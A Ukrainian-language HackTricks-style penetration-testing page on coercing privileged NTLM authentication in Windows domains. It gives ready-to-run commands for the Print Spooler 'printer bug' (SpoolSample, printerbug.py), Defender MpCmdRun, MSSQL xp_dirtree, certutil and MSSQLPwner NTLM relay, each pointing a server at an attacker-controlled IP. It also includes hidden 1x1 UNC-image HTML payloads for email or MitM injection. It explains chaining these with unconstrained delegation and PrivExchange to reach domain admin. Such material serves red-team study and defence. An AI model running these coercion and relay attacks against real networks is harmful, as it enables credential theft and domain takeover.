# Примусова NTLM Привілейована Аутентифікація

{% hint style="success" %}
Вивчайте та практикуйте Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Діліться хакерськими трюками, подаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) - це **колекція** **триггерів віддаленої аутентифікації**, написаних на C# з використанням компілятора MIDL для уникнення залежностей від сторонніх розробників.

## Зловживання Службою Спулера

Якщо служба _**Print Spooler**_ **увімкнена**, ви можете використовувати деякі вже відомі облікові дані AD, щоб **запросити** у серверу друку контролера домену **оновлення** нових друкованих завдань і просто сказати йому **надіслати сповіщення на якусь систему**.\
Зверніть увагу, що коли принтер надсилає сповіщення на довільні системи, йому потрібно **аутентифікуватися** проти цієї **системи**. Тому зловмисник може змусити службу _**Print Spooler**_ аутентифікуватися проти довільної системи, і служба **використає обліковий запис комп'ютера** в цій аутентифікації.

### Пошук Windows серверів у домені

Використовуючи PowerShell, отримайте список Windows машин. Сервери зазвичай є пріоритетними, тому зосередимося на них:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Знаходження служб Spooler, що слухають

Використовуючи трохи модифікований @mysmartlogin (Вінсент Ле Ту)'s [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), перевірте, чи слухає служба Spooler:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Ви також можете використовувати rpcdump.py на Linux і шукати протокол MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Запросіть службу аутентифікацію проти довільного хоста

Ви можете скомпілювати[ **SpoolSample звідси**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
або використовуйте [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви на Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Поєднання з неконтрольованою делегацією

Якщо зловмисник вже скомпрометував комп'ютер з [неконтрольованою делегацією](unconstrained-delegation.md), зловмисник може **змусити принтер аутентифікуватися на цьому комп'ютері**. Через неконтрольовану делегацію **TGT** облікового запису **комп'ютера принтера** буде **збережено** в **пам'яті** комп'ютера з неконтрольованою делегацією. Оскільки зловмисник вже скомпрометував цей хост, він зможе **отримати цей квиток** і зловживати ним ([Pass the Ticket](pass-the-ticket.md)).

## RCP Примусова аутентифікація

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Атака `PrivExchange` є наслідком вразливості, виявленої в **функції `PushSubscription` Exchange Server**. Ця функція дозволяє серверу Exchange бути примушеним будь-яким доменним користувачем з поштовою скринькою аутентифікуватися на будь-якому хості, наданому клієнтом, через HTTP.

За замовчуванням **служба Exchange працює як SYSTEM** і має надмірні привілеї (зокрема, вона має **привілеї WriteDacl на домен до 2019 Cumulative Update**). Цю вразливість можна експлуатувати для дозволу **пересилання інформації до LDAP і, відповідно, витягнення бази даних домену NTDS**. У випадках, коли пересилання до LDAP неможливе, цю вразливість все ще можна використовувати для пересилання та аутентифікації на інших хостах у домені. Успішна експлуатація цієї атаки надає негайний доступ до адміністратора домену з будь-яким аутентифікованим обліковим записом домену.

## Всередині Windows

Якщо ви вже всередині машини Windows, ви можете змусити Windows підключитися до сервера, використовуючи привілейовані облікові записи за допомогою:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Або використовуйте цю іншу техніку: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Можливо використовувати certutil.exe lolbin (підписаний Microsoft бінарний файл) для примусу NTLM аутентифікації:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Якщо ви знаєте **адресу електронної пошти** користувача, який входить у систему на машині, яку ви хочете скомпрометувати, ви можете просто надіслати йому **електронний лист з зображенням 1x1** таким як
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
і коли він його відкриє, він спробує аутентифікуватися.

### MitM

Якщо ви можете виконати атаку MitM на комп'ютер і вставити HTML на сторінку, яку він буде переглядати, ви можете спробувати вставити зображення, подібне до наступного, на сторінку:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Злом NTLMv1

Якщо ви можете захопити [виклики NTLMv1, читайте тут, як їх зламати](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;ем'ятайте, що для зламу NTLMv1 вам потрібно встановити виклик Responder на "1122334455667788"_

{% hint style="success" %}
Вчіться та практикуйте Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Вчіться та практикуйте Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
